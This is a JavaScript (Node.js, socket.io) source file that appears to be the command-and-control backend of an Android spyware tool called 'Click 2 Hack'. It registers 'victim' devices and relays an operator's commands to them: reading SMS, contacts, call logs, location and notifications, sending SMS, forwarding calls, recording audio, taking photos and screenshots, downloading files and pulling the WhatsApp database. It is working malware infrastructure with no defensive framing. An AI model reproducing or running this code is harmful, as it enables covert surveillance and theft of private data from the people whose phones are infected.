const express = require('express');
const app = express()
const server = require('http').createServer(app)
const { Server } = require('socket.io')
const io = new Server(server, {
  maxHttpBufferSize: 1e8,
});

var victimList={};
var deviceList={};
var victimData={};
var adminSocketId=null;
const port = 8080;

server.listen(process.env.PORT || port, (err) => {  if (err) return;log("Server Started : " + port);});
app.get('/', (req, res) => res.send('Welcome to Click 2 Hack Backend Server'));

io.on('connection', (socket) => {
    socket.on('adminJoin', ()=>{
        adminSocketId=socket.id;
        if(Object.keys(victimData).length>0){
            Object.keys(victimData).map((key)=>socket.emit("join", victimData[key]));
        }
    })
    socket.on('request', request);
    socket.on('join',(device)=>{
        log("Victim joined => "+JSON.stringify(device.id));
        victimList[device.id] = socket.id;
        victimData[device.id] = {...device, socketId: socket.id};
        deviceList[socket.id] = {"id": device.id, "model": device.model};
        socket.broadcast.emit("join", {...device, socketId: socket.id});
    });

    socket.on('getDir',(data)=>response("getDir",data));
    socket.on('getInstalledApps',(data)=>response("getInstalledApps",data));
    socket.on('getContacts',(data)=>response("getContacts",data));
    socket.on('sendSMS',(data)=>response("sendSMS",data));
    socket.on('getCallLog',(data)=>response("getCallLog",data));
    socket.on("previewImage", (data) =>response("previewImage",data));
    socket.on("error", (data) =>response("error",data));
    socket.on("getSMS", (data) =>response("getSMS",data));
    socket.on('getLocation',(data)=>response("getLocation",data));
    socket.on('batteryUpdate',(data)=>response("batteryUpdate",data));
    socket.on('enableCallForward',(data)=>response("enableCallForward",data));
    socket.on('disableCallForward',(data)=>response("disableCallForward",data));
    socket.on('callForwardResult',(data)=>response("callForwardResult",data));
    socket.on('startRecording',(data)=>response("startRecording",data));
    socket.on('stopRecording',(data)=>response("stopRecording",data));
    socket.on('audioRecording',(data)=>response("audioRecording",data));
    socket.on('audioRecordingStatus',(data)=>response("audioRecordingStatus",data));
    socket.on('vibrate',(data)=>response("vibrate",data));
    socket.on('vibrateResult',(data)=>response("vibrateResult",data));
    socket.on('turnOnTorch',(data)=>response("turnOnTorch",data));
    socket.on('turnOffTorch',(data)=>response("turnOffTorch",data));
    socket.on('torchResult',(data)=>response("torchResult",data));
    socket.on('takePicture',(data)=>response("takePicture",data));
    socket.on('cameraCaptureResult',(data)=>response("cameraCaptureResult",data));
    socket.on('takeScreenshot',(data)=>response("takeScreenshot",data));
    socket.on('screenshotResult',(data)=>response("screenshotResult",data));
    socket.on('getNotifications',(data)=>response("getNotifications",data));
    socket.on('notificationData',(data)=>response("notificationData",data));
    
    // Permission Events
    socket.on('getPermissionsStatus',(data)=>response("getPermissionsStatus",data));
    socket.on('requestPermissions',(data)=>response("requestPermissions",data));
    socket.on('permissionsStatus',(data)=>response("permissionsStatus",data));

    socket.on('disconnect', () => {
        if(socket.id===adminSocketId){ adminSocketId=null }
        else{
            response("disconnectClient",socket.id)
            Object.keys(victimList).map((key)=>{ if(victimList[key] === socket.id){ delete victimList[key]; delete victimData[key]; } })
        }
    });
    
    socket.on("download", (d, callback) =>responseBinary("download", d, callback));
    socket.on("downloadWhatsappDatabase", (d, callback) => { socket.broadcast.emit("downloadWhatsappDatabase", d, callback); });
});

const request =(d)=>{ let { to, action, data } = JSON.parse(d); log("Requesting action: "+ action); io.to(victimList[to]).emit(action, data); }
const response =(action, data)=>{ if(adminSocketId){ log("response action: "+ action); io.to(adminSocketId).emit(action, data); } }
const responseBinary =(action, data, callback)=>{ if(adminSocketId){ log("response action: "+ action); callback("success"); io.to(adminSocketId).emit(action, data); } }
const log = (log) =>{ console.log(log) }
